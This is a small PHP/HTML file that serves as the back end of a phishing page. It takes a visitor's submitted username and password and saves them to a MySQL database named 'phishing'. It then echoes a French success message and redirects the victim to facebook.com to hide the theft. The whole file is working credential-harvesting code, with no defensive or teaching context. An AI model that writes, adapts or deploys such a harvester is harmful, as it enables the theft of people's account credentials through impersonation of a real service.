<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Document</title>
</head>

<body>



    <?php


    try {
        $bdd = new PDO('mysql:host=localhost;dbname=phishing;charset=utf8', 'root', '');
    } catch (Exception $e) {
        die('Erreur : ' . $e->getMessage());
    }



    $Username = $_POST["username"];
    $Password = $_POST["password"];
    echo $Username . " " . $Password;


    $req = $bdd->prepare('INSERT INTO resultat( Username, Password,IP) 
    VALUES( :Username, :Password ,"MonIP")');

    $req->execute(array(
    'Username' => $Username,
    'Password' => $Password

     ));
     echo 'Le compte a bien ete ajouter !';
     header('Location: https://www.facebook.com');
     ?>

</body>

</html>